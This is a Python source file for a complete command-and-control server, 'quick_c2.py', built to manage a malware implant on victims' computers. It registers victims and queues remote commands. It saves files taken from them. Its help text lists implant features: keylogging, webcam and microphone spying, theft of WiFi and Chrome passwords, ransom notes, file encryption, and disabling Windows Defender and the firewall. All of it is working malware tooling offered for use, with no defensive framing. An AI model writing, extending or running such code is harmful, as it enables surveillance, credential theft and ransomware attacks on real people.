# quick_c2.py - Running on his Windows computer
"""
quick_c2.py
============

Lightweight JSON‑over‑TCP C2 server designed to work directly with the
`ghost.py` implant (non‑Discord transport).

Protocol (length‑prefixed JSON):
--------------------------------
All messages are:
    [4‑byte big‑endian length][JSON bytes]

Client → Server messages:
    {"type": "register", "id": "<VICTIM_ID>", "user": "...", "host": "...", "os": "..."}
    {"type": "poll",     "id": "<VICTIM_ID>"}
    {"type": "result",   "id": "<VICTIM_ID>", "task_id": "<id>", "ok": bool,
     "output": "text output (optional)", "file_name": "name.ext", "file_b64": "...."}

Server → Client messages:
    {"type": "task", "task_id": "<id>", "command": "/shell whoami"}
    {"type": "noop"}   # no task available

Operator console:
-----------------
    list                    - list all registered victims
    use <VICTIM_ID>         - select a victim
    info                    - show info about selected victim
    tasks                   - show pending tasks for selected victim
    send <command string>   - enqueue a command for selected victim
    broadcast <command>     - enqueue same command for all victims
    quit / exit             - stop server
"""

import base64
import json
import os
import socket
import threading
import time
import warnings
from dataclasses import dataclass, field
from datetime import datetime
from typing import Dict, List, Optional

# Disable deprecation warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

# Enhanced console input with history support
try:
    import readline
    HAS_READLINE = True
except ImportError:
    HAS_READLINE = False

HOST = "0.0.0.0"
PORT = 8443


# ====================== Data structures ======================

@dataclass
class Task:
    task_id: str
    command: str
    created_at: datetime = field(default_factory=datetime.utcnow)
    file_name: Optional[str] = None
    file_b64: Optional[str] = None


@dataclass
class Victim:
    vid: str
    user: str
    host: str
    os: str
    addr: str
    first_seen: datetime = field(default_factory=datetime.utcnow)
    last_seen: datetime = field(default_factory=datetime.utcnow)
    tasks: List[Task] = field(default_factory=list)


victims: Dict[str, Victim] = {}
victims_lock = threading.Lock()


# ====================== Helper functions ======================

def _recv_exact(conn: socket.socket, n: int) -> bytes:
    """Receive exactly n bytes or raise ConnectionError."""
    buf = b""
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Connection closed while reading")
        buf += chunk
    return buf


def recv_json(conn: socket.socket) -> Optional[dict]:
    """Read a single JSON message (length‑prefixed)."""
    header = conn.recv(4)
    if not header:
        return None
    if len(header) < 4:
        header += _recv_exact(conn, 4 - len(header))
    length = int.from_bytes(header, "big")
    if length <= 0 or length > 100_000_000:  # Increased to 100MB for video files
        raise ValueError(f"Invalid message length: {length}")
    data = _recv_exact(conn, length)
    return json.loads(data.decode("utf-8", errors="replace"))


def send_json(conn: socket.socket, obj: dict) -> None:
    data = json.dumps(obj).encode("utf-8")
    header = len(data).to_bytes(4, "big")
    conn.sendall(header + data)


def next_task_for(vid: str) -> Optional[Task]:
    with victims_lock:
        v = victims.get(vid)
        if not v or not v.tasks:
            return None
        return v.tasks.pop(0)


def add_task(vid: str, command: str, file_name: Optional[str] = None, file_b64: Optional[str] = None) -> str:
    task_id = f"{int(time.time())}-{int(time.time_ns() % 1_000_000)}"
    t = Task(task_id=task_id, command=command, file_name=file_name, file_b64=file_b64)
    with victims_lock:
        v = victims.get(vid)
        if not v:
            raise ValueError(f"No such victim: {vid}")
        v.tasks.append(t)
    return task_id


# ====================== Client handler ======================

def handle_client(conn: socket.socket, addr):
    peer = f"{addr[0]}:{addr[1]}"
    try:
        hello = recv_json(conn)
        if not hello or hello.get("type") != "register":
            print(f"[!] {peer} sent invalid register message")
            return

        vid = str(hello.get("id") or "").strip()
        if not vid:
            print(f"[!] {peer} missing victim ID")
            return

        user = str(hello.get("user") or "?")
        host = str(hello.get("host") or "?")
        os_name = str(hello.get("os") or "?")

        with victims_lock:
            v = victims.get(vid)
            if v is None:
                v = Victim(vid=vid, user=user, host=host, os=os_name, addr=addr[0])
                victims[vid] = v
                print(f"[+] New victim {vid} ({user}@{host}, {os_name}) from {addr[0]}")
            else:
                v.user = user
                v.host = host
                v.os = os_name
                v.addr = addr[0]
                v.last_seen = datetime.utcnow()
                print(f"[+] Reconnect from {vid} ({user}@{host})")

        # Main message loop
        while True:
            msg = recv_json(conn)
            if msg is None:
                break

            mtype = msg.get("type")
            with victims_lock:
                if vid in victims:
                    victims[vid].last_seen = datetime.utcnow()

            if mtype == "poll":
                task = next_task_for(vid)
                if task:
                    send_json(
                        conn,
                        {
                            "type": "task",
                            "task_id": task.task_id,
                            "command": task.command,
                            "file_name": task.file_name,
                            "file_b64": task.file_b64,
                        },
                    )
                else:
                    send_json(conn, {"type": "noop"})

            elif mtype == "result":
                task_id = msg.get("task_id")
                ok = bool(msg.get("ok", True))
                output = msg.get("output") or ""
                file_name = msg.get("file_name")
                file_b64 = msg.get("file_b64")

                status = "OK" if ok else "ERROR"
                print(f"\n[RESULT] Victim {vid} | Task {task_id} | {status}")
                if output:
                    print("--- OUTPUT START ---")
                    print(output)
                    print("--- OUTPUT END ---")

                if file_name and file_b64:
                    try:
                        raw = base64.b64decode(file_b64.encode("utf-8"))
                        out_path = f"received_{vid}_{int(time.time())}_{file_name}"
                        with open(out_path, "wb") as f:
                            f.write(raw)
                        print(f"[FILE] Saved file from {vid} as {out_path}")
                    except Exception as e:
                        print(f"[FILE] Failed to save file from {vid}: {e}")

            else:
                print(f"[?] Unknown message type from {vid}: {mtype}")

    except (ConnectionError, OSError):
        print(f"[-] Connection closed: {peer}")
    except Exception as e:
        print(f"[!] Error handling client {peer}: {e}")
    finally:
        try:
            conn.close()
        except Exception:
            pass


def server_loop(stop_event: threading.Event):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORT))
    srv.listen(50)
    print(f"[*] quick_c2 listening on {HOST}:{PORT}")

    try:
        while not stop_event.is_set():
            try:
                srv.settimeout(1.0)
                conn, addr = srv.accept()
            except socket.timeout:
                continue
            t = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
            t.start()
    finally:
        srv.close()


# ====================== Operator console ======================

def print_victims():
    with victims_lock:
        if not victims:
            print("No victims connected yet.")
            return
        print("=== Victims ===")
        victim_list = list(victims.items())
        for idx, (vid, v) in enumerate(victim_list, 1):
            age = (datetime.utcnow() - v.first_seen).total_seconds()
            seen = (datetime.utcnow() - v.last_seen).total_seconds()
            
            # Connection status indicator
            if seen < 10:
                status = "🟢 ONLINE"
            elif seen < 60:
                status = "🟡 IDLE"
            else:
                status = "🔴 OFFLINE"
                
            print(
                f"[{idx}] {status} {vid} | {v.user}@{v.host} | {v.os} | addr={v.addr} | "
                f"first_seen={int(age)}s ago | last_seen={int(seen)}s ago | "
                f"queued_tasks={len(v.tasks)}"
            )


def get_victim_by_number(num: int) -> Optional[str]:
    """Get victim ID by number from the list"""
    with victims_lock:
        victim_list = list(victims.keys())
        if 1 <= num <= len(victim_list):
            return victim_list[num - 1]
    return None


def operator_console(stop_event: threading.Event):
    current_vid: Optional[str] = None
    
    # Setup readline for command history and arrow key support
    if HAS_READLINE:
        # Configure readline for better experience
        readline.set_startup_hook(None)
        readline.clear_history()
        
        # Enable tab completion (basic)
        commands = ['list', 'use', 'info', 'tasks', 'clear', 'clearall', 'send', 'upload', 
                   'broadcast', 'status', 'help', 'quit', 'exit']
        
        # Add common implant commands for tab completion
        implant_commands = ['/shell', '/status', '/ls', '/cd', '/pwd', '/dl', '/pic', '/webcam', 
                           '/screenshot', '/video', '/mic', '/keylog', '/stop', '/livecam', 
                           '/stopcam', '/wifi', '/pass', '/ransom', '/lock', '/unlock', 
                           '/encrypt', '/disabledefender', '/disablefirewall', '/admin', '/upload']
        
        all_commands = commands + implant_commands
        
        def completer(text, state):
            options = [cmd for cmd in all_commands if cmd.startswith(text)]
            if state < len(options):
                return options[state]
            return None
        
        readline.set_completer(completer)
        readline.parse_and_bind("tab: complete")
        
        # Load command history from file if it exists
        history_file = os.path.expanduser("~/.c2_history")
        try:
            if os.path.exists(history_file):
                readline.read_history_file(history_file)
                print(f"[*] Loaded command history ({readline.get_current_history_length()} commands)")
        except Exception:
            pass
        
        # Set history length
        readline.set_history_length(1000)
        print("[*] Command history enabled. Use ↑/↓ arrow keys to navigate previous commands.")
    else:
        print("[!] Warning: readline not available. Arrow key history disabled.")
        print("[!] Install readline: pip install pyreadline3 (Windows) or use Linux/macOS")
    
    print("[*] C2 Console ready. Type 'help' for commands.")
    
    while not stop_event.is_set():
        try:
            # Show current victim in prompt
            if current_vid:
                prompt = f"c2({current_vid[:8]}...)> "
            else:
                prompt = "c2> "
                
            if HAS_READLINE:
                line = input(prompt).strip()
            else:
                # Fallback for systems without readline
                line = input(prompt).strip()
                    
        except (EOFError, KeyboardInterrupt):
            print("\nExiting operator console.")
            # Save history before exit
            if HAS_READLINE:
                try:
                    readline.write_history_file(history_file)
                    print(f"[*] Command history saved to {history_file}")
                except Exception:
                    pass
            stop_event.set()
            break

        if not line:
            continue

        # Auto-handle commands starting with / (implant commands)
        if line.startswith('/'):
            if not current_vid:
                print("No victim selected. Use 'use <VICTIM_ID>' or 'use <NUMBER>' first.")
                continue
            try:
                task_id = add_task(current_vid, line)
                print(f"Enqueued task {task_id} for {current_vid}: {line}")
            except Exception as e:
                print(f"Failed to enqueue task: {e}")
            continue

        parts = line.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""

        if cmd in ("quit", "exit"):
            # Save history before exit
            if HAS_READLINE:
                try:
                    readline.write_history_file(history_file)
                    print(f"[*] Command history saved")
                except Exception:
                    pass
            stop_event.set()
            break

        elif cmd == "list":
            print_victims()

        elif cmd == "use":
            vid_input = arg.strip()
            if not vid_input:
                print("Usage: use <VICTIM_ID> or use <NUMBER>")
                print("Tip: Use 'list' to see numbered victims, then 'use 1', 'use 2', etc.")
                continue
            
            # Check if input is a number
            if vid_input.isdigit():
                num = int(vid_input)
                vid = get_victim_by_number(num)
                if not vid:
                    print(f"Invalid victim number: {num}")
                    print("Use 'list' to see available victims with their numbers.")
                    continue
            else:
                vid = vid_input
            
            with victims_lock:
                if vid not in victims:
                    print(f"No such victim: {vid}")
                    if not vid_input.isdigit():
                        print("Tip: Use 'list' to see numbered victims, then 'use <number>'")
                else:
                    current_vid = vid
                    v = victims[vid]
                    print(
                        f"Selected {vid} ({v.user}@{v.host}, {v.os}) "
                        f"with {len(v.tasks)} queued task(s)."
                    )

        elif cmd == "info":
            if not current_vid:
                print("No victim selected. Use 'use <VICTIM_ID>' first.")
                continue
            with victims_lock:
                v = victims.get(current_vid)
                if not v:
                    print(f"Selected victim {current_vid} is gone.")
                    current_vid = None
                else:
                    print(
                        f"Victim {v.vid} | {v.user}@{v.host} | {v.os} | "
                        f"addr={v.addr}\n"
                        f"First seen: {v.first_seen} | Last seen: {v.last_seen}\n"
                        f"Queued tasks: {len(v.tasks)}"
                    )

        elif cmd == "tasks":
            if not current_vid:
                print("No victim selected. Use 'use <VICTIM_ID>' first.")
                continue
            with victims_lock:
                v = victims.get(current_vid)
                if not v:
                    print(f"Selected victim {current_vid} is gone.")
                    current_vid = None
                else:
                    if not v.tasks:
                        print("No queued tasks.")
                    else:
                        print("Queued tasks:")
                        for t in v.tasks:
                            print(f"- {t.task_id}: {t.command} (since {t.created_at})")

        elif cmd == "clear":
            if not current_vid:
                print("No victim selected. Use 'use <VICTIM_ID>' first.")
                continue
            with victims_lock:
                v = victims.get(current_vid)
                if not v:
                    print(f"Selected victim {current_vid} is gone.")
                    current_vid = None
                else:
                    cleared_count = len(v.tasks)
                    v.tasks.clear()
                    print(f"Cleared {cleared_count} queued task(s) for {current_vid}")

        elif cmd == "clearall":
            with victims_lock:
                if not victims:
                    print("No victims to clear tasks for.")
                else:
                    total_cleared = 0
                    for vid, v in victims.items():
                        cleared_count = len(v.tasks)
                        v.tasks.clear()
                        total_cleared += cleared_count
                        if cleared_count > 0:
                            print(f"Cleared {cleared_count} task(s) for {vid}")
                    print(f"Total: Cleared {total_cleared} queued task(s) across all victims")

        elif cmd == "send":
            if not current_vid:
                print("No victim selected. Use 'use <VICTIM_ID>' first.")
                continue
            command = arg.strip()
            if not command:
                print("Usage: send <command string>")
                continue
            try:
                task_id = add_task(current_vid, command)
                print(f"Enqueued task {task_id} for {current_vid}: {command}")
            except Exception as e:
                print(f"Failed to enqueue task: {e}")

        elif cmd == "upload":
            if not current_vid:
                print("No victim selected. Use 'use <VICTIM_ID>' first.")
                continue
            args = arg.split()
            if len(args) < 1:
                print("Usage: upload <local_path> [remote_path]")
                continue
            local_path = args[0]
            remote_path = args[1] if len(args) > 1 else os.path.basename(local_path)
            if not os.path.exists(local_path) or not os.path.isfile(local_path):
                print(f"Local file not found: {local_path}")
                continue
            try:
                with open(local_path, "rb") as f:
                    raw = f.read()
                file_b64 = base64.b64encode(raw).decode("utf-8")
                file_name = os.path.basename(local_path)
                task_id = add_task(
                    current_vid,
                    f"/upload {remote_path}",
                    file_name=file_name,
                    file_b64=file_b64,
                )
                print(
                    f"Enqueued upload task {task_id} for {current_vid}: "
                    f"{local_path} -> {remote_path}"
                )
            except Exception as e:
                print(f"Failed to enqueue upload: {e}")

        elif cmd == "broadcast":
            command = arg.strip()
            if not command:
                print("Usage: broadcast <command string>")
                continue
            with victims_lock:
                if not victims:
                    print("No victims to broadcast to.")
                else:
                    for vid in list(victims.keys()):
                        try:
                            task_id = add_task(vid, command)
                            print(f"Enqueued task {task_id} for {vid}")
                        except Exception as e:
                            print(f"Failed to enqueue for {vid}: {e}")

        elif cmd == "status":
            print(f"=== C2 Server Status ===")
            print(f"Listening on: {HOST}:{PORT}")
            print(f"Total victims: {len(victims)}")
            
            # Count by status
            online = idle = offline = 0
            with victims_lock:
                for v in victims.values():
                    seen = (datetime.utcnow() - v.last_seen).total_seconds()
                    if seen < 10:
                        online += 1
                    elif seen < 60:
                        idle += 1
                    else:
                        offline += 1
            
            print(f"🟢 Online: {online} | 🟡 Idle: {idle} | 🔴 Offline: {offline}")
            if current_vid:
                print(f"Selected victim: {current_vid}")
            else:
                print("No victim selected")

        elif cmd == "help":
            print(
                "Commands:\n"
                "  list                     - list victims with numbers\n"
                "  status                   - show server status\n"
                "  use <VICTIM_ID|NUMBER>   - select victim by ID or number (e.g., 'use 1')\n"
                "  info                     - show selected victim info\n"
                "  tasks                    - list queued tasks for selected victim\n"
                "  clear                    - clear queued tasks for selected victim\n"
                "  clearall                 - clear queued tasks for all victims\n"
                "  send <command>           - send command to selected victim\n"
                "  broadcast <command>      - send command to all victims\n"
                "  upload <local> [remote]  - upload local file to selected victim\n"
                "  help                     - show this help\n"
                "  quit / exit              - stop server\n\n"
                "Navigation:\n"
                "  Use ↑/↓ arrow keys to navigate command history\n"
                "  Use 'list' to see numbered victims, then 'use <number>' for easy selection\n"
                "  Type commands starting with '/' directly (no need for 'send')\n\n"
                "Implant commands (type directly with '/'):\n"
                "  /shell <cmd>             - execute shell command\n"
                "  /status                  - show system status\n"
                "  /ls [path]               - list directory contents\n"
                "  /cd <path>               - change directory\n"
                "  /pwd                     - show current working directory\n"
                "  /dl <file>               - download file\n"
                "  /pic                     - take webcam photo\n"
                "  /webcam [index]          - take webcam photo (specify camera index)\n"
                "  /screenshot [count]      - take screen capture (default: 1, max: 50)\n"
                "  /video [duration]        - record screen video (default: 30s, max: 300s)\n"
                "  /mic                     - record audio\n"
                "  /keylog                  - start keylogger\n"
                "  /stop                    - stop all monitoring\n"
                "  /livecam [duration]      - start live webcam stream\n"
                "  /stopcam                 - stop webcam stream\n"
                "  /wifi                    - extract WiFi passwords\n"
                "  /pass                    - extract Chrome saved passwords\n"
                "  /ransom                  - deploy ransom note\n"
                "  /lock                    - lock screen with a warning\n"
                "  /unlock                  - unlock screen\n"
                "  /encrypt                 - encrypt files in current/default directories\n"
                "  /disabledefender         - disable Windows Defender (requires admin)\n"
                "  /disablefirewall         - disable Windows Firewall (requires admin)\n"
                "  /admin                   - attempt UAC elevation\n"
                "  /upload <filename>       - upload file to victim (use with upload command)\n"
            )

        else:
            print("Unknown command. Type 'help' for options.")


if __name__ == "__main__":
    stop_event = threading.Event()
    t_srv = threading.Thread(target=server_loop, args=(stop_event,), daemon=True)
    t_srv.start()
    try:
        operator_console(stop_event)
    finally:
        stop_event.set()